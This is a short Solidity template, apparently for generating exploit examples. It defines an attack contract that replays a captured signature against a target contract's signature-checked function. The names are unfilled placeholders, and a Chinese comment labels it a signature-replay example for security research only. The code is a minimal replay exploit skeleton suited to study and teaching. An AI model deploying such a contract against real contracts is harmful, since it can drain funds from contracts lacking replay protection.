// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title $ATTACK_CONTRACT_NAME
/// @notice 针对 $TARGET_CONTRACT_NAME 的签名重放示例，仅用于安全研究
interface ISignatureTarget {
    function $EXECUTE_WITH_SIG(
        address signer,
        uint256 value,
        bytes calldata signature
    ) external;
}

contract $ATTACK_CONTRACT_NAME {
    ISignatureTarget public target;

    constructor(address _target) {
        target = ISignatureTarget(_target);
    }

    function replay(
        address signer,
        uint256 value,
        bytes calldata signature
    ) external {
        target.$EXECUTE_WITH_SIG(signer, value, signature);
    }
}

